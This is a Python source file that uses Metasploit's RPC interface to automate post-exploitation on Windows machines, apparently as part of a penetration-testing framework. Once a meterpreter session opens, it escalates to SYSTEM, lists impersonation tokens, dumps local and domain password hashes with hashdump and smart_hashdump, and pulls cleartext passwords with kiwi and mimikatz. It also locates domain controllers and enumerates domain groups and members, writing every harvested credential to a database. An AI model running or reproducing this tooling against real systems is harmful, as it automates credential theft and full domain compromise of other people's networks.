import msfrpc
import time
import os

def logVal(fn,  val):
        print "{0} :: {1}".format(fn,  val)
        f = open("logs/{0}".format(fn),'a+')
        f.write(val + '\n')
        f.close()

def setupMeterpreter(client, console_id, log_name, init):
    ##
    ## Return value array returns
    ## 1) whether the meterpreter was set up successfully
    ## 2) the setup log
    ## 3) whether the task should be run again. This is set to True when the setup fails due to a metasploit failure
    ##

    log = []
    for i in init:
        client.call('console.write', [console_id, i + "\n"])
        time.sleep(0.25)
    
    startTime = time.time()
    
    got_meterpreter = False
    while got_meterpreter == False:
        res = client.call('console.read',[console_id])

        exitFunction = False        
        runAgain = False
        failure_messages = [ "STATUS_ACCESS_DENIED", "STATUS_LOGON_FAILURE", "Auto-targeting failed", "Invalid SQL Server credentials", "Exploit failed", "Exploit completed, but no session was created" ]
        for m in failure_messages:
            if res['data'].find(m) > 0:
                log.append(res['data'])
                logVal(log_name,  res['data'])
                exitFunction = True
        
        ## This sometimes gets thrown by the psexec module, and causes it to fail in places it usually works
        ## So when I see it, I wait a bit and try again
        rerun_messages = [ 'STATUS_CANNOT_DELETE', 'The following options failed to validate', 'timeout-expired' ]
        for m in rerun_messages:
            if res['data'].find(m) > -1:
                log.append(res['data'])
                logVal(log_name, res['data'])
                runAgain = True
                exitFunction = True

        if exitFunction == True:
            return [False, log, runAgain]
                
        if len(res['data']) > 0:
            for l in res['data'].split("\n"):
                if l != "":
                    log.append(l.replace("\r",  ""))
                    logVal(log_name,  l.replace("\r",  ""))
        
        if res['prompt'].find("meterpreter") != -1:
            log.append("got meterpreter >")
            logVal(log_name,  "got meterpreter >")
            log.append("")
            logVal(log_name,  "")
            got_meterpreter = True

        time.sleep(1)
        if time.time() - startTime >= 60 * 5:
            log.append("More than five minutes have passed. the meterpreter isn't coming back. calling it")
            logVal(log_name,  "More than five minutes have passed. the meterpreter isn't coming back. calling it")
            return [False, log, True]

    return [True, log, False]

def runCommand(client, console_id, log_name, command, expectedTime, timeLimit, completedString, secondRun = False):
    log = []
    notLoaded = False
    completed = False
    completeOnNextCycle = False
    startTime = time.time()

    log.append("meterpreter> {0}".format(command))
    logVal(log_name,  "meterpreter> {0}".format(command))
    client.call('console.write', [console_id, "{0}\n".format(command)])

    time.sleep(expectedTime)
    while completed == False:
        #if completeOnNextCycle == True:
        #    completed = True
        
        if time.time() - startTime >= timeLimit:
            completed = True
            notLoaded = True
         
        res = client.call('console.read',[console_id])
        if res['data'] == "":
            time.sleep(5)
            res = client.call('console.read',[console_id])
        
        if res['data'] == "":
            if completeOnNextCycle == True:
                completed = True
        else:
            for l in res['data'].split("\n"):
                if l != "":
                    log.append(l)
                    logVal(log_name,  l)
                    
                    if l.find("Unknown command: ") != -1:
                        completed = True
                        notLoaded = True
                        break
                    elif l.find("Error running command ") != -1:
                        completed = True
                        notLoaded = True
                        break
                    
                    for s in completedString:
                        if l.find(s) != -1:
                            completeOnNextCycle = True
                            #time.sleep(5)
                    
    log.append("")
    logVal(log_name,  "")

    if notLoaded == True:
        if secondRun == False:
            log.append("error while running command. will try again")
            logVal(log_name,  "error while running command. will try again")
            time.sleep(60)
            for l in runCommand(client, console_id, log_name, command, expectedTime, timeLimit, completedString, True):
                log.append(l)

    return log
        
def parseLSAOutput(params, lsa_log):
    #name = ""
    service = ""
    #ntlm = ""
    current = ""
    #old = ""

    users = []
    in_lsa = False

    for l in lsa_log:
        if l.find("Secret Count") != -1:
            in_lsa = True
        elif in_lsa:
            if l.find(".") == -1:
                in_lsa = False
                break
            #print "lsa_log :: " + l
            if l.find("Name") != -1:
                if service != "" and current != "":
                    #print "found these :: [{0}]\t[{1}]\t[{2}]\t[{3}]\t[{4}]".format(name, service, ntlm, current, old)
                    users.append([service, current])
                #name = l.split(":")[1].strip()
                service = ""
                #ntlm = ""
                current = ""
                #old = ""
            elif l.find("Service") != -1:
                service = l.split(":")[1].strip()
            #elif l.find("NTLM") != -1:
            #    ntlm = l.split(":")[1].strip()
            elif l.find("Current") != -1:
                current = l.split(":")[1].strip()
            #elif l.find("Old") != -1:
            #    old = l.split(":")[1].strip()
    if service != "" and current != "":
        #print "found these :: [{0}]\t[{1}]\t[{2}]\t[{3}]\t[{4}]".format(name, service, ntlm, current, old)
        users.append([service, current])
    return users
        
def runMsf(params, host_id, init, log_name):
    #startTime = time.time()
    log = []
    
    computer_name = ""
    host_os = ""
    architecture = ""
    system_language = ""
    host_domain = ""
    
    mustMigrate = False

    try:
        client = msfrpc.Msfrpc({'port':int(params.msf_port)})
        client.login(user=params.msf_user, password=params.msf_pass)
        res = client.call('console.create')
    
        console_id = res['id']
    except:
        params.log("there was an error connecting to the metasploit instance")
        params.setReturnValue("run again")
        return [False, log, True]
    
    res = setupMeterpreter(client, console_id, log_name, init)
    if res[2] == True:
        params.setReturnValue("run again")
    
    hasPermission = False
    
    for l in res[1]:
        log.append(l)
    
    if res[0] == True:
        hasPermission = True
        for l in runCommand(client, console_id, log_name, "getuid", 3, 60, [ "username" ]):
            log.append(l)

        for l in runCommand(client, console_id, log_name, "webcam_list", 3, 60, [ "No webcams were found", "Operation failed" ]):
            log.append(l)

        for l in runCommand(client, console_id, log_name, "sysinfo", 3, 60, [ "Meterpreter" ]):
            log.append(l)
            try:
                #if l.find("Computer") != -1:
                if l[:8] == "Computer":
                    #computer_name = l[l.find("Computer") + 9:].split(":")[1].strip()
                    computer_name = l.split(":")[1].strip()
                #elif l.find("OS") != -1:
                elif l[:2] == "OS":
                    #host_os = l[l.find("OS") + 3:].split(":")[1].strip()
                    host_os = l.split(":")[1].strip()
                #elif l.find("Architecture") != -1:
                elif l[:12] == "Architecture":
                    #architecture = l[l.find("Architecture") + 13:].split(":")[1].strip()
                    architecture = l.split(":")[1].strip()
                #elif l.find("System Language") != -1:
                elif l[:15] == "System Language":
                    #system_language = l[l.find("System Language") + 16:].split(":")[1].strip()
                    system_language = l.split(":")[1].strip()
                #elif l.find("Domain") != -1:
                elif l[:6] == "Domain":
                    #host_domain = l[l.find("Domain") + 7:].split(":")[1].strip()
                    host_domain = l.split(":")[1].strip()
                #elif l.find("Meterpreter") != -1:
                elif l[:11] == "Meterpreter":
                    #if l[l.find("Meterpreter") + 11:].split(":")[1].strip().split("/")[0] != architecture[:3]:
                    if l.split(":")[1].strip().split("/")[0] != architecture[:3]:
                        mustMigrate = True
            except:
                print "DEBUG :: error extracting val from [{}]".format(l)


        #print "sysinfo results comp[{}] os[{}] arch [{}] lan[{}] domain[{}]".format(computer_name, host_os, architecture, system_language, host_domain)

        if host_domain != "":
            #print "DEBUG :: host domain is " + host_domain
            sql = "update host_data set computer_name = %s, os = %s, architecture = %s, system_language = %s, domain = %s where id = %s"
            cursor = params.db.cursor()
            cursor.execute(sql, (computer_name, host_os, architecture, system_language, host_domain, host_id, ))
            cursor.close()

            cursor = params.db.cursor()
            cursor.execute("select addDomain(%s, %s::varchar)", (params.footprint_id, host_domain, ))
            cursor.close()

        closeWinShell = False
        dcname = ""
        dcip = ""
        #dcflags = ""
        
        for l in runCommand(client, console_id, log_name, """execute -f cmd -a "/K nltest /dclist:" -i -d -H""", 3, 60, [ "C:" ]):
            log.append(l)
            if l.find("[DS]") != -1:
                while l.find("  ") != -1:
                    l = l.replace("  ", " ")
                hostname = l.split(" ")[1]
                dcips = os.popen("host {} | cut -d \  -f 4".format(hostname)).read()[:-1]
                for dcip in dcips.split("\n"):
                    if dcip != "found:":
                        print "dc {} has ip {}".format(hostname, dcip)

                        cursor = params.db.cursor()
                        #cursor.execute("call addHost(%s, %s, %s, 1)",  (params.footprint_id, dcip, hostname, ))
                        cursor.execute("select addHost(%s, %s::varchar, %s::varchar, true)",  (params.footprint_id, dcip, hostname, ))
                        cursor.close()
    
                        sql = "update host_data set domain = %s::varchar where footprint_id = %s and ip_address = %s::varchar"
                        cursor = params.db.cursor()
                        cursor.execute(sql, (host_domain, params.footprint_id, dcip, ))
                        cursor.close()

            if l[:2] == "C:":
                if closeWinShell == False:
                    closeWinShell = True
        
        if closeWinShell:
            runCommand(client, console_id, log_name, "exit", 3, 5, [ ], True)
            closeWinShell
        
        for l in runCommand(client, console_id, log_name, """execute -f cmd -a "/K nltest /dsgetdc: /IP" -i -d -H""", 3, 60, [ "C:" ]):
            log.append(l)
            #if l.find("DC: ") != -1: dcname = l.split(":")[1].strip()
            if l.find("Address") != -1: dcip = l.split(":")[1].strip()[2:]
            elif l.find("Dom Name") != -1: dcname = l.split(":")[1].strip().split(".")[0]
            elif l.find("Flags:") != -1: 
                #dcflags = l.split(":")[1].strip()
                #print "found domain controller: {0} {1} {2}".format(dcname, dcip, dcflags)
                
                cursor = params.db.cursor()
                #cursor.execute("call addHost(%s, %s, '', 1)",  (params.footprint_id,  dcip, ))
                cursor.execute("select addHost(%s, %s::varchar, ''::varchar, true)",  (params.footprint_id,  dcip, ))
                cursor.close()
                
                sql = "update host_data set domain = %s where footprint_id = %s and ip_address = %s"
                cursor = params.db.cursor()
                cursor.execute(sql, (host_domain, params.footprint_id, dcip, ))
                cursor.close()

            if l[:2] == "C:":
                if closeWinShell == False:
                    closeWinShell = True
        
        if closeWinShell:
            runCommand(client, console_id, log_name, "exit", 3, 5, [ ], True)
            closeWinShell

        for l in runCommand(client, console_id, log_name, "getsystem", 3, 60, [ "got system via technique", "Operation failed" ]):
            log.append(l)
            
        for l in runCommand(client, console_id, log_name, "use incognito", 3, 60, [ "success", "extension has already been loaded" ]):
            log.append(l)

        for l in runCommand(client, console_id, log_name, "list_tokens -u", 3, 60, [ "Impersonation Tokens Available" ]):
            log.append(l)
            if l.find("Tokens Available") == -1 and l.find("list_tokens") == -1 and l.find("=====") == -1:
                if l != "":
                    cursor = params.db.cursor()
                    #cursor.execute("call addToken(%s, %s)", (host_id, l.strip(), ))
                    cursor.execute("select addToken(%s, %s::varchar)", (host_id, l.strip(), ))
                    cursor.close()

        foundHashes = False
        for l in runCommand(client, console_id, log_name, "run post/windows/gather/hashdump", 3, 60, [ "Dumping password hashes..." ]):
            log.append(l)
            if foundHashes == True:
                if l != "":
                    info = l.split(":")
                    cursor = params.db.cursor()
                    #cursor.execute("call addLocalCredentials(%s, %s, %s, %s, %s)", (host_id, info[0], "", info[2], info[3], ))
                    cursor.execute("select addLocalCredentials(%s, %s::varchar, %s::varchar, %s::varchar, %s::varchar)", (host_id, info[0], "", info[2], info[3], ))
                    cursor.close()
            if l.find("Dumping password hashes") != -1:
                foundHashes = True

        for l in runCommand(client, console_id, log_name, "use kiwi", 3, 10, [ "success", "extension has already been loaded" ]):
            log.append(l)

        lsa_log = []
        for l in runCommand(client, console_id, log_name, "lsa_dump", 3, 60, [ "NTLM Hash", "SAM Key Count" ]):
            log.append(l)
            lsa_log.append(l)

        for user in parseLSAOutput(params, lsa_log):
            domain = user[0].split("\\")[0].upper()
            username = user[0].split("\\")[1]
            
            if user[0].split("\\")[0].upper() == host_domain.upper():
                cursor = params.db.cursor()
                #cursor.execute("call addDomainCreds(%s, %s, %s, %s, %s, '', '')",  (params.footprint_id, host_id, domain, username, user[1], ))
                cursor.execute("select addDomainCreds(%s, %s, %s::varchar, %s::varchar, %s::varchar, '', '')",  (params.footprint_id, host_id, domain, username, user[1], ))
                cursor.close()
            #TODO: call this function when you find a place to test it
            #else:
            #    print "local creds found: {0} {1}".format(user[0], user[1])

        if mustMigrate == True:
            for l in runCommand(client, console_id, log_name, "run post/windows/manage/sp_smart_migrate", 3, 60,
                                [ "Successfully migrated to process", "Was unable to sucessfully migrate" ]):
                log.append(l)
        
            for l in runCommand(client, console_id, log_name, "getsystem", 3, 60, [ "got system via technique", "Operation failed" ]):
                log.append(l)
       
        for l in runCommand(client, console_id, log_name, "creds_all", 3, 60, [ "Domain" ]):
            log.append(l)
 
        for l in runCommand(client, console_id, log_name, "use mimikatz", 3, 60, [ "success." ]):
            log.append(l)
        
        for l in runCommand(client, console_id, log_name, "mimikatz_command -f sekurlsa::searchPasswords", 3, 60, [ "Error", "erreur", "Access is denied",  "}" ]):
            log.append(l)
            if l[:1] == "[":
                try:
                    details = l.split("{")[1].split("}")[0].split(";")
                    username = details[0][1:-1]
                    domain   = details[1][1:-1]
                    password = details[2][1:-1]
                    
                    if (domain == computer_name):
                        cursor = params.db.cursor()
                        cursor.execute("call addLocalCredentials(%s, %s, %s, %s, %s)", (host_id, username, password, "", "", ))
                        cursor.close()
                    else:
                        if username.find("$") == -1:
                            if username == host_domain:
                                temp = username
                                username = domain
                                domain = temp
                                
                            if domain == host_domain:
                                cursor = params.db.cursor()
                                cursor.execute("call addDomainCreds(%s, %s, %s, %s, %s, '', '')",  (params.footprint_id, host_id, domain, username, password, ))
                                cursor.close()
                                #print ""
                                #print "found domain credentials : [{0}\{1}:{2}]".format(domain, username, password)
                                #print "" 
                except:
                    print "error extracting creds from :" + l
        
        for l in runCommand(client, console_id, log_name, "exit", 3, 5, [ "closed" ]):
            log.append(l)
            
    return [hasPermission, log, False]
    
def runMsf_GatherDomainUsersAndGroups(params, domain_id, init, log_name):
    log = []
        
    client = msfrpc.Msfrpc({'port':int(params.msf_port)})
    client.login(user=params.msf_user, password=params.msf_pass)
    res = client.call('console.create')
    
    console_id = res['id']
    
    runWithDifferentUser = False
    
    res = setupMeterpreter(client, console_id, log_name, init)
    if res[2] == True:
        params.setReturnValue("run again")
    hasPermission = False
    
    for l in res[1]:
        log.append(l)
    
    if res[0] == True:
        hasPermission = True
        for l in runCommand(client, console_id, log_name, "execute -f cmd  -i -d -H", 3, 60, [ ">" ]):
            log.append(l)
            
        for l in runCommand(client, console_id, log_name, """dsquery group -limit 0""", 3, 60, [ ">" ]):
            log.append(l)
            if l.find("The target principal name is incorrect") != -1:
                runWithDifferentUser = True
            if l.find("'dsquery' is not recognized as an internal or external command") != -1:
                runWithDifferentUser = True
            if l[:1] == '"': 
                print "DEBUG :: " + l
                cursor = params.db.cursor()
                cursor.execute("call addDomainGroup(%s, %s, %s)",  (params.footprint_id, domain_id, l.split(",")[0].split("=")[1], ))
                cursor.close()
            
        cursor = params.db.cursor()
        cursor.execute("select id, group_name from domain_groups where footprint_id = %s and domain_id = %s",  (params.footprint_id, domain_id, ))
        items = cursor.fetchall()
        cursor.close()
        
        for row in items:
            for l in runCommand(client, console_id, log_name, """dsquery group -name "{0}" | dsget group -members | dsget user -samid""".format(row[1]), 3, 120, [ ">" ], True):
                log.append(l)
                #print "DEBUG !!! [{}] [{}]".format(l[:-1], l[:-1][:2])

                #print "DEBUG !! [{}] [{}] [{}] [{}]".format(l[:-1], l[:1], l[:2], l[:3])
                #DANE
                if l[:2] == "  ":
                    if l[2:-1].strip() != "samid":
                        #print "add user [{}] to group [{}]".format(l[2:-1].strip(), "bla")
                        cursor = params.db.cursor()
                        cursor.execute("call addDomainUserToGroup(%s, %s, %s, %s)",  (params.footprint_id, domain_id, l[2:-1].strip(), row[0], ))
                        cursor.close()

                #if l[:-1][:2] == " ":
                #    print "add user [{}] to group [{}]".format(l[1:-1], "bla")
                #else:
                #    print "var [{}] doesn't satisfy".format(l[:2])
                #if l[:1] == '"':
                #    if l.find("CN=Users") != -1:
                #        userName = l.split(",")[0].split("=")[1]
                #        #groupName = row[1]
                #        #print "found domain group map. {0} is in the group {1}".format(userName, row[1)
                #        #print "running this sql: call addDomainUserToGroup({}, {}, {}, {})".format(params.footprint_id, domain_id, userName, row[0])
                #        cursor = params.db.cursor()
                #        cursor.execute("call addDomainUserToGroup(%s, %s, %s, %s)",  (params.footprint_id, domain_id, userName, row[0], ))
                #        cursor.close()
        
        for l in runCommand(client, console_id, log_name, "exit", 3, 5, [ ],  True):
            log.append(l)
        
        for l in runCommand(client, console_id, log_name, "exit", 3, 5, [ "closed" ]):
            log.append(l)
            
        if runWithDifferentUser == True:
            #print "the thing failed, mark it as such in the db, and try again with a different set of creds"
            pass
        else:
            cursor = params.db.cursor()
            cursor.execute("update domains set info_gathered = 1 where id = %s", (domain_id, ))
            cursor.close()
            
    return [hasPermission, log, runWithDifferentUser]

def runMsf_ExtractDomainHashes(params, domain_id, init, log_name):
    log = []
        
    client = msfrpc.Msfrpc({'port':int(params.msf_port)})
    client.login(user=params.msf_user, password=params.msf_pass)
    res = client.call('console.create')
    
    console_id = res['id']
    
    res = setupMeterpreter(client, console_id, log_name, init)
    if res[2] == True:
        params.setReturnValue("run again")
    hasPermission = False
    
    for l in res[1]:
        log.append(l)
    
    if res[0] == True:
        hasPermission = True
        for l in runCommand(client, console_id, log_name, "getuid", 3, 60, [ "username" ]):
            log.append(l)
        
        host_domain = ""
        for l in runCommand(client, console_id, log_name, "sysinfo", 3, 60, [ "Meterpreter" ]):
            log.append(l)
            if l.find("Domain") != -1:
                host_domain = l[l.find("Domain") + 7:].split(":")[1].strip()
        
        if host_domain == "":
            time.sleep(60)
            for l in runCommand(client, console_id, log_name, "sysinfo", 3, 60, [ "Meterpreter" ]):
                log.append(l)
                if l.find("Domain") != -1:
                    host_domain = l[l.find("Domain") + 7:].split(":")[1].strip()

        for l in runCommand(client, console_id, log_name, "getsystem", 3, 60, [ "got system via technique" ]):
            log.append(l)

        for l in runCommand(client, console_id, log_name, "run post/windows/manage/sp_smart_migrate", 3, 60,
                 [ "Successfully migrated to process", "Was unable to sucessfully migrate" ]):
            log.append(l)

        inHashesSection = False
        for l in runCommand(client, console_id, log_name, "run post/windows/gather/smart_hashdump", 3, 60 * 60, [ "$" ]):
            log.append(l)
            if l.find("Dumping password hashes...") != -1:
                inHashesSection = True
            if inHashesSection == True:
                if l[:3] == "[+]":
                    d = l.split(":")
                    username = d[0][3:].strip()
                    lm_hash = d[2]
                    ntlm_hash = d[3]

                    if username.find("$") == -1:
                        #print "found hash {0}\{1} {2}:{3}".format(host_domain, username, lm_hash, ntlm_hash)
                        cursor = params.db.cursor()
                        cursor.execute("call addDomainCreds(%s, 0, %s, %s, '', %s, %s)",  (params.footprint_id, host_domain, username, lm_hash, ntlm_hash, ))
                        cursor.close()
                    
        
        for l in runCommand(client, console_id, log_name, "exit", 3, 5, [ "closed" ]):
            log.append(l)
            
        cursor = params.db.cursor()
        cursor.execute("update domains set hashes_extracted = 1 where id = %s", (domain_id, ))
        cursor.close()
        
        cursor = params.db.cursor()
        cursor.execute("call executeTriggers(%s, %s, 11, '');", (params.footprint_id, domain_id, ))
        cursor.close()
            
    return [hasPermission, log]
